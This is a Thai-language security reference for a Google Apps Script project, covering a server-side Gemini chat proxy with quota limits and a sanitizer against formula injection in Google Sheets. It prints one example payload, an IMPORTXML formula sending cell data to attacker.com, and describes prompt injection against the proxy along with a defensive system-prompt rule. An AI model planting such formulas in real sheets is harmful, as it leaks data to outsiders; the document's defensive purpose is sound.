# Security, AI Proxy & Sheets Protection Reference

เอกสารนี้อธิบายมาตรฐานความปลอดภัยในการสร้าง AI Chat Proxy บน Google Apps Script และการบันทึกข้อมูลฟอร์มลง Google Sheets

---

## 1. มาตรการรักษาความปลอดภัยของ AI Chatbot (Gemini Proxy)

### ปัญหาที่พบบ่อยเมื่อสร้าง AI Chatbot บนเว็บสาธารณะ:
1. **API Key รั่วไหล**: หากเรียก Gemini จาก JavaScript ฝั่งหน้าเว็บ API Key จะถูกเปิดเผยใน Developer Tools
2. **Prompt Injection / Quota Theft**: หาก Client ส่ง System Prompt หรือเลือกโมเดลเองได้ ผู้ไม่หวังดีจะแอบใช้ Proxy ไปคุยเรื่องอื่นหรือสั่งการโมเดลแพงๆ จนโควต้าหมด

### สถาปัตยกรรมที่ปลอดภัย (Server-Side Construction)
```
[Client]                [Apps Script Server]               [Google Gemini API]
   │                             │                                  │
   │── POST {question, history} ─>│                                  │
   │                             │ 1. เช็กความยาวคำถาม (<= 1,000 char)│
   │                             │ 2. เช็กโควตารวม (Quota.js)        │
   │                             │ 3. ดึง API Key จาก ScriptProperties│
   │                             │ 4. สังเคราะห์ System Prompt จาก    │
   │                             │    Data.js + chat-prompt.md เท่านั้น│
   │                             │                                  │
   │                             │── POST /v1beta/models/... ───────>│
   │                             │   { contents, systemInstruction }│
   │                             │<── JSON Response ─────────────────│
   │<── { ok: true, answer } ────│                                  │
```

### การตั้งค่าใน Apps Script (`Chat.js`)
* **API Key**: ดึงจาก Script Properties เท่านั้น:
  ```javascript
  var apiKey = PropertiesService.getScriptProperties().getProperty('GEMINI_API_KEY');
  ```
* **ส่ง key ทาง header** `x-goog-api-key` ไม่ใส่ใน URL (`?key=`) — ถ้าการเชื่อมต่อล้ม ข้อความ error จะมี URL ติดไปด้วย · `Router.js` log error ไว้ฝั่ง server แล้วตอบผู้ใช้ด้วยข้อความทั่วไปเท่านั้น
* **โควตารวมทุกผู้ใช้** (`apps-script/Quota.js` → `takeQuota_('chat')`): Apps Script ไม่รู้ IP ผู้เรียก จึงจำกัดรายคนไม่ได้
  - ต่อนาที: ตัวนับใน `CacheService` (key ตามนาที หมดอายุเอง) · ต่อวัน: Script Properties เก็บ `"วันที่|จำนวน"` ตามเวลาแปซิฟิก (รอบเดียวกับ Gemini)
  - ครอบด้วย `LockService.getScriptLock()` กันคำขอพร้อมกันนับทับกัน · เกินโควตาตอบปฏิเสธทันที (ไม่ sleep รอคิว)
  - ตั้งตาม Gemini free tier 15 RPM / 250 RPD / 250K TPM — คำถามละ ~25K token ขาเข้า จึงตั้ง 9/นาที 240/วัน · ดูยอดวันนี้: รัน `showQuotaUsage` · ทดสอบ: `scripts/test-quota.mjs`
* **จำกัดคำตอบ** `maxOutputTokens: 1024` และส่ง `usage` (จำนวน token) กลับใน response เพื่อติดตามโควตา
* **Retry**: ลองใหม่เฉพาะ 429/5xx สูงสุด 3 ครั้ง (รอ 2s, 4s) และ retry แต่ละครั้งนับโควตาด้วย
* **Prompt injection**: system prompt ระบุว่าข้อความผู้ใช้และประวัติแชตเป็นข้อมูล ไม่ใช่คำสั่ง — ห้ามเปลี่ยนบทบาท/เปิดเผยคำสั่งระบบ/ตอบนอกขอบเขต

---

## 2. การป้องกัน Formula Injection ใน Google Sheets (`Feedback.js`)

### ความเสี่ยงของ Formula Injection (CSV/Sheet Injection)
หากผู้ใช้กรอกข้อความในแบบฟอร์ม Feedback เช่น:
```text
=IMPORTXML("https://attacker.com/steal?data=" & A1, "//a")
```
เมื่อเจ้าหน้าที่เปิดดู Google Sheet โปรแกรมจะคำนวณสูตรนั้นทันที และอาจส่งข้อมูลในตารางออกไปหาบุคคลภายนอก

### มาตรการป้องกัน (Sanitization)
> ในโปรเจกต์นี้คือ `cell_(value, maxLen)` ใน `apps-script/Feedback.js` (ตัดความยาว + เติม `'`) และ Feedback มีโควตา 10/นาที 100/วัน — โค้ดด้านล่างเป็นตัวอย่างหลักการ

ก่อนนำสตริงใดๆ ไปบันทึกใน Google Sheet ต้องตรวจสอบอักขระตัวแรก หากขึ้นต้นด้วยอักขระสั่งการของสูตร (`=`, `+`, `-`, `@`, `\t`, `\r`) ให้เติมเครื่องหมาย Single Quote (`'`) นำหน้าเสมอ:

```javascript
function sanitizeCell_(val) {
  if (val === null || val === undefined) return '';
  var str = String(val);
  if (/^[=+\-@\t\r]/.test(str)) {
    return "'" + str; // Google Sheets จะมองเป็นข้อความธรรมดา ไม่ประมวลผลสูตร
  }
  return str;
}
```

### การบันทึกแถวข้อมูลลงในชีต
```javascript
function handleFeedback(body) {
  var row = [
    new Date(),
    sanitizeCell_(body.type),
    sanitizeCell_(body.detail),
    sanitizeCell_(body.sender),
    sanitizeCell_(body.contact),
    sanitizeCell_(body.page)
  ];
  sheet.appendRow(row);
  return jsonOut_({ ok: true, message: 'บันทึกสำเร็จ' });
}
```
